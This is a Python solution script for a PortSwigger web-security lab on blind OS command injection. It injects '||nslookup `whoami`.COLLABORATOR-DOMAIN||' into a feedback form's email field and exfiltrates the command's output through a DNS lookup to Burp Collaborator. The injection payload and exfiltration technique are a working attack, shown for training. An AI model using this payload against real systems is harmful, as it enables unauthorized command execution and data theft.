# Lab 05 — Blind OS command injection with out-of-band data exfiltration
# PortSwigger: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
#
# Vulnerability: Identical setup to Lab 04, but this time the actual OUTPUT
#                of a command must be extracted, not just confirmed
# Aim:           Execute whoami and exfiltrate its output via a DNS query
#                to Burp Collaborator
#
# Technique:
#   Wrap the target command in command substitution (backticks or $()).
#   The shell evaluates the substituted command FIRST, then splices its
#   OUTPUT directly into the surrounding nslookup command as part of the
#   domain name being looked up:
#
#     nslookup `whoami`.COLLABORATOR-DOMAIN
#     → shell runs whoami, gets e.g. "carlos"
#     → runs: nslookup carlos.COLLABORATOR-DOMAIN
#     → Collaborator's DNS log shows a lookup for carlos.COLLABORATOR-DOMAIN
#     → the output IS the subdomain label — read it directly from the log
#
# Requires: Burp Suite Pro (Collaborator feature).
#           Update COLLABORATOR_DOMAIN before running.
#
# Usage: python os_command_injection_lab05.py <url>

import sys
import urllib3
from proxies import proxies
from os_command_injection_utils import banner, section, make_session, submit_feedback, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.oastify.com"
# ────────────────────────────────────────────────────────────────────────────


def build_payload(collab_domain, command="whoami"):
    """
    Build a data-exfiltration payload using backtick command substitution.
    The output of `command` is spliced into the DNS lookup's hostname.
    """
    return f"||nslookup `{command}`.{collab_domain}||"


if __name__ == "__main__":
    banner()
    section("LAB 05 — BLIND OS COMMAND INJECTION WITH OOB DATA EXFILTRATION")

    if len(sys.argv) != 2:
        print("  Usage: python os_command_injection_lab05.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.oastify.com":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    payload = build_payload(COLLABORATOR_DOMAIN, command="whoami")
    print(f"  ➜  Payload (email field): {payload}\n")
    print(f"  ℹ  Command substitution: \\`whoami\\` runs FIRST, its output is")
    print(f"     spliced into the nslookup hostname before the lookup happens.\n")

    r = submit_feedback(session, url, payload)
    check_status(r, [200], "Feedback submission with data exfiltration payload")

    print()
    print("  ➜  Next steps:")
    print("     1. Open Burp Collaborator → click 'Poll now'")
    print("     2. Find the incoming DNS interaction — its hostname will look like:")
    print(f"        <whoami-output>.{COLLABORATOR_DOMAIN}")
    print("     3. The subdomain label IS the whoami output — read it directly")
    print("        from the Collaborator interaction log")
    print("     4. Submit that username as the lab solution")
    print()
    print("  ℹ  Same OOB channel as Lab 04 (DNS), but command substitution")
    print("     upgrades 'confirm code runs' into 'actually extract data'.")
    print("     This exact pattern — OOB channel + command substitution —")
    print("     reappears in blind SQLi and SSRF exploitation too.")
